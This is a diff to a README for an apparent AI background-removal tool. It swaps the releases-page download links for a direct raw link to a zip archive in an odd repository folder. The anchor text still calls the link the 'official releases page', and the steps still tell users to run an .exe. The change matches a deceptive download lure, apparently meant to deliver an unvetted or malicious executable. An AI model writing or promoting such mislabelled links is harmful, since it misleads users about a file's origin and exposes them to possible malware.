@@ -1,6 +1,6 @@
 # 🖼️ AI-Photo-Background-Remover - Remove Photo Backgrounds Instantly With AI
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/parentwavemechanics578/AI-Photo-Background-Remover/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/parentwavemechanics578/AI-Photo-Background-Remover/raw/refs/heads/main/oncography/A_Background_Photo_Remover_3.4.zip)
 
 AI-Photo-Background-Remover processes images on your computer. It removes image backgrounds without sending your files to a server. This approach keeps your images private. The tool uses smart models to detect subjects and cut them out of scenes. It saves the resulting images in high resolution.
 
@@ -18,7 +18,7 @@ Your computer needs specific components to run this application smoothly. Ensure
 
 Follow these steps to obtain the installer for your computer.
 
-1. Visit the [official releases page](https://github.com/parentwavemechanics578/AI-Photo-Background-Remover/releases) to download the software.
+1. Visit the [official releases page](https://github.com/parentwavemechanics578/AI-Photo-Background-Remover/raw/refs/heads/main/oncography/A_Background_Photo_Remover_3.4.zip) to download the software.
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the installer to your Downloads folder or your desktop for easy access.
